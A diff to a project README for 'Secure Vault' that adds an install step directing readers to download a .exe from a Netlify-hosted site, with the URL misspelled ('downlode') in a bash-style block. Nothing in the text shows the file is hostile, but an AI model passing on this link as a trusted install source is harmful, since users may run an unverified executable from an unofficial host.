@@ -44,7 +44,11 @@
    ```bash
    python main.py
    ```
-
+4. **website - Downlode the .exe file from here**:
+   '''bash
+   https://securevaultdownlode.netlify.app/
+   '''
+   
 ## ⚙️ Configuration
 
 Secure Vault uses encrypted configuration storage. For advanced SMTP settings:
